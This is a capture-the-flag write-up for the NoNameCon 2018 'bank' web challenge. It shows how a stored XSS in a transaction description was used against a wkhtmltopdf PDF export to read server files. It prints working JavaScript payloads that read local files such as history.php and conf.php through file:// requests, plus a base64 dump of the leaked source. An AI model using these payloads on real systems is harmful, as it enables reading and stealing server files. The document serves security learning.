# CTF - 2018 - NoNameCon CTF Quals 2018 / Web / bank

## web - 200 pts - local file access with js and html to pdf

- note: sry, The challenge website is no more available, so there will be no screenshots :'(


- We register and connect to the bank website.
- In the page bank.php we can transfert found to someone else or to ourselves.
- In the html sourcecode we see a comment to a page `history.php?type=html`
- This page give us the history and we can find an xss in it.
- After trying some extension, we finaly find something interresting, a pdf extension is available and the pdf result contain the following informations :
```
pdfinfo history.pdf
Title:          
Creator:        wkhtmltopdf 0.12.2.4
Producer:       Qt 5.5.1
...
```
- So they use wkhtmltopdf
- This lib convert html to pdf, but also read the javascript.
- A research on web lead me to this report : https://cure53.de/pentest-report_accessmyinfo.pdf which is interesting because we can do "Local File Access via HTML to PDF conversion"
- So we can do a transfert with the following payload in description to get our data :
```
<h1 id='test2'>a</h1><script>x = new XMLHttpRequest();
x.open('GET','file:///var/www/html/history.php',false);
x.send();
document.getElementById('test2').innerHTML= x.responseText;
</script>
```
- This work, the pdf lib call the javascript, the file is loaded and we get the source code, but the source is incomplete due to php specials chars and because the pdf truncate it.

- So i cut the code into chunk of 60 char in base64 to be able to read all the content :
```
<div id='p'>a</div><script>x = new XMLHttpRequest();
x.open('GET','file:///var/www/html/history.php',false);
x.send();
var a = '';
for(var i=0; i< x.responseText.length; i=i+60 ) {
a = a +  btoa(x.responseText.substr(i, 60))+ '<br>';
}
document.getElementById('p').innerHTML= a;
</script>
```

- Result give me :
```
PD9waHAKaW5jbHVkZSAnY29uZi5waHAnOwpzZXNzaW9uX3N0YXJ0KCk7CmlmKCAhJF9TRVNTSU9OWydp
ZCddICkgewogIGhlYWRlcignTG9jYXRpb246IGxvZ2luLnBocCcpOwogIGRpZTsKfQokdHlwZSA9ICRf
R0VUWyd0eXBlJ10gPz8gJ2h0bWwnOwoKJHN0bXQgPSAkcGRvLT5wcmVwYXJlKCdTRUxFQ1QgaWQsIChT
RUxFQ1QgdXNlcm5hbWUgRlJPTSB1c2VycyBXSEVSRSBpZD1zZW5kZXIpIGFzIHNlbmRlciwoU0VMRUNU
IHVzZXJuYW1lIEZST00gdXNlcnMgV0hFUkUgaWQ9cmVjaXBpZW50KSBhcyByZWNpcGllbnQsIGFtb3Vu
dCwgZGVzY3JpcHRpb24gRlJPTSB0cmFuc2FjdGlvbnMgV0hFUkUgKHNlbmRlciA9IDpzZW5kZXIgT1Ig
cmVjaXBpZW50ID0gOnJlY2lwaWVudCkgT1JERVIgQlkgaWQgREVTQycpOwokc3RtdC0+YmluZFBhcmFt
KCc6c2VuZGVyJywgJF9TRVNTSU9OWydpZCddLCBQRE86OlBBUkFNX0lOVCk7CiRzdG10LT5iaW5kUGFy
YW0oJzpyZWNpcGllbnQnLCAkX1NFU1NJT05bJ2lkJ10sIFBETzo6UEFSQU1fSU5UKTsKJHN0bXQtPmV4
ZWN1dGUoKTsKCiR0cmFuc2FjdGlvbnMgPSBbXTsKd2hpbGUoICRyb3cgPSAkc3RtdC0+ZmV0Y2goKSAp
CiAgJHRyYW5zYWN0aW9ucyBbXT0gJHJvdzsKCiRoaXN0b3J5X2h0bWwgPSAnJzsKJGhpc3RvcnlfaHRt
bCAuPSA8PDxFT1QKICAgIDx0YWJsZSBzdHlsZT0id2lkdGg6MTAwJTt0ZXh0LWFsaWduOmxlZnQ7Ym9y
ZGVyOiAzcHggc29saWQgYmxhY2s7Ij4KICAgICAgPHRyPjx0aCB3aWR0aD0yMD5JRDwvdGg+PHRoIHdp
ZHRoPTEwMD5TZW5kZXI8L3RoPjx0aCB3aWR0aD0xMDA+UmVjaXBpZW50PC90aD48dGggd2lkdGg9NTA+
QW1vdW50PC90aD48dGggd2lkdGg9NTAwPkRlc2NyaXB0aW9uPC90aD48L3RyPgpFT1Q7CmZvcmVhY2go
JHRyYW5zYWN0aW9ucyBhcyAkdHJhbnNhY3Rpb24pIHsKICAkaGlzdG9yeV9odG1sIC49IHNwcmludGYo
Jzx0cj48dGQ+JXU8L3RkPjx0ZD4lczwvdGQ+PHRkPiVzPC90ZD48dGQ+JXU8L3RkPjx0ZD4lczwvdGQ+
PC90cj4nLiBQSFBfRU9MLCAKICAgICR0cmFuc2FjdGlvblsnaWQnXSwKICAgIGh0bWxlbnRpdGllcygk
dHJhbnNhY3Rpb25bJ3NlbmRlciddKSwKICAgIGh0bWxlbnRpdGllcygkdHJhbnNhY3Rpb25bJ3JlY2lw
aWVudCddKSwKICAgICR0cmFuc2FjdGlvblsnYW1vdW50J10sCiAgICAkdHlwZSA9PT0gJ2h0bWwnID8g
aHRtbGVudGl0aWVzKCR0cmFuc2FjdGlvblsnZGVzY3JpcHRpb24nXSkgOiAkdHJhbnNhY3Rpb25bJ2Rl
c2NyaXB0aW9uJ10KICApOwp9CiRoaXN0b3J5X2h0bWwgLj0gPDw8RU9UCiAgICA8L3RhYmxlPgpFT1Q7
CgppZiggJHR5cGUgPT09ICdwZGYnICkgewogICR0bXBmaWxlICA9IHRlbXBuYW0oc3lzX2dldF90ZW1w
X2RpcigpLCBzcHJpbnRmKCdiYW5rLSV1LScsICRfU0VTU0lPTlsnaWQnXSkpOwogICRodG1sZmlsZSA9
ICR0bXBmaWxlIC4gJy5odG1sJzsKICAkcGRmZmlsZSAgPSAkdG1wZmlsZSAuICcucGRmJzsKICBmaWxl
X3B1dF9jb250ZW50cygkaHRtbGZpbGUsICRoaXN0b3J5X2h0bWwpOwogIGV4ZWMoInh2ZmItcnVuIHdr
aHRtbHRvcGRmICRodG1sZmlsZSAkcGRmZmlsZSIpOwogIGhlYWRlcignQ29udGVudC1UeXBlOiBhcHBs
aWNhdGlvbi9wZGYnKTsKICByZWFkZmlsZSgkcGRmZmlsZSk7CiAgdW5saW5rKCR0bXBmaWxlKTsgdW5s
aW5rKCRodG1sZmlsZSk7IHVubGluaygkcGRmZmlsZSk7CiAgZGllOwp9Cj8+CjwhRE9DVFlQRSBodG1s
Pgo8aHRtbD4KPGhlYWQ+CiAgPD9waHAgaW5jbHVkZSAnLi9wYXJ0aWFscy9oZWFkLnBocCcgPz4KPC9o
ZWFkPgo8Ym9keT4KICA8ZGl2IGNsYXNzPSJiYW5uZXIiPgogICAgPD9waHAgaW5jbHVkZSAnLi9wYXJ0
aWFscy91c2VyX2hlYWRlci5waHAnID8+CiAgPC9kaXY+CiAgPGRpdiBjbGFzcz0ianVtYm90cm9uIG1h
c3RoZWFkIj4KICAgIDxkaXYgY2xhc3M9ImNvbnRhaW5lciB3aC00NSI+CiAgICA8cD5UcmFuc2FjdGlv
biBIaXN0b3J5PC9wPgogICAgPD89JGhpc3RvcnlfaHRtbDs/PgogICAgPC9kaXY+CiAgPC9kaXY+CiAg
PD9waHAgaW5jbHVkZSAnLi9wYXJ0aWFscy9mb290ZXIucGhwJyA/PgogIDxzY3JpcHQgdHlwZT0idGV4
dC9qYXZhc2NyaXB0Ij4KICAgIC8qIGluaXQgSmFyYWxsYXggKi8KICAgICQoJy5qYXJhbGxheCcpLmph
cmFsbGF4KHsKICAgICAgc3BlZWQ6IDAuNSwKICAgICAgaW1nV2lkdGg6IDEzNjYsCiAgICAgIGltZ0hl
aWdodDogNzY4CiAgICB9KQogIDwvc2NyaXB0Pgo8L2JvZHk+CjwvaHRtbD4K
```

- With that, i get the code in the pdf and i retreive it with copy/paste on  [cyberchef](https://gchq.github.io/CyberChef/) (this tool is so usefull)

- we can now find the complete code and the configuration file include
```
<?php
include 'conf.php';
session_start();
...
```
- So i continue with the conf.php and find something interesting :
```
...
$flag = file_get_contents('/flag');
$DEFAULT_BALANCE = 100;
...
```

- ok just have to read the /flag file now
```
nnc{1b97d726c1332b6d6632ff5d8468e8be}
```

By team Beers4Flags

```
 ________
|        |
|  #BFF  |
|________|
   _.._,_|,_
  (      |   )
   ]~,"-.-~~[
 .=] Beers ([
 | ])  4   ([
 '=]) Flags [
   |:: '    |
    ~~----~~
```
